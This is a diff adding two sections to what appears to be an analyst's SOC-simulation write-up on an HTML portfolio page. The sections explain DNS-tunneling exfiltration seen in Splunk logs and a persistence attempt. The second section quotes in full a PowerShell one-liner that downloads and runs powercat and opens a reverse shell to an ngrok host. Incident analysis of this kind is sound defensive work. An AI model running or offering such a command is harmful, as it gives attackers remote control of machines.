@@ -447,6 +447,39 @@ This is the definitive evidence of <code>DNS tunneling</code> in action. The att
                 />
               </div>
 
+              <h3 class="project-details__content-title">Continued DNS Exfiltration</h3>
+              <p class="project-details__desc-para">
+Here we can notice that the continued use of <code>haz4rdw4re.io</code> as the target domain. However, the <code>base64</code> encoded strings preceding <code>haz4rdw4re.io</code> are different in each log. This is precisely how <code>DNS tunneling</code> works: the attacker breaks the exfiltrated file (in our case, <code>exfilt8me.zip</code>) into smaller chunks, <code>base64</code> encodes each chunk, and then sends them one by one as subdomains in <code>DNS</code> queries to their controlled server.</p>
+              <p class="project-details__desc-para">
+These multiple <code>nslookup</code> calls with varying <code>base64</code> strings confirm that the data exfiltration is an ongoing process, with the attacker diligently sending the stolen financial data out of our network in a segmented and stealthy manner. This is definitely the data breach in full swing.</p>
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/22-dnstunneling.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-32"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
+              <h3 class="project-details__content-title">Persistence Attempt and Initial Cleanup</h3>
+              <p class="project-details__desc-para">
+This <code>powershell</code> event, at <code>1:05:41.540 PM</code>, is incredibly important. It shows the attacker attempting to establish persistence and then trying to cover their tracks.</p>
+              <p class="project-details__desc-para">
+Looking at the <code>process.command_line</code>, it's the familiar malicious <code>PowerShell</code> command we saw at the beginning: <code>powershell.exe -IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell</code>. This is the attacker trying to re-download <code>powermac.ps1</code> and establish another <code>reverse shell</code> connection to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is a clear attempt to create a backdoor or <code>reverse shell</code> to ensure they can regain access to <code>win-3450</code> later, even if their initial session is lost.</p>
+             <p class="project-details__desc-para">
+However, the message also contains <code>Stop-Process</code>. This indicates that immediately after (or alongside) this persistence attempt, the attacker is also trying to gracefully terminate their <code>PowerShell</code> process. This is a common defense evasion tactic, as shutting down their processes can make it harder for security tools or analysts to detect ongoing malicious activity. It's an attempt at cleanup, even while trying to maintain future access. This log shows the attacker trying to solidify their future access while minimizing immediate traces.</p>
+ 
+              <div class="project-details__img-cont">
+                <img
+                  src="./assets/SocSim2/23-backdoor.png"
+                  alt="Splunk AD Server Logs Screenshot 0"
+                  class="constrained-image"
+                  id="image-33"
+                  onclick="showOriginal(this)"
+                />
+              </div>
+
   
             </div>
             <div class="project-details__tools-used">
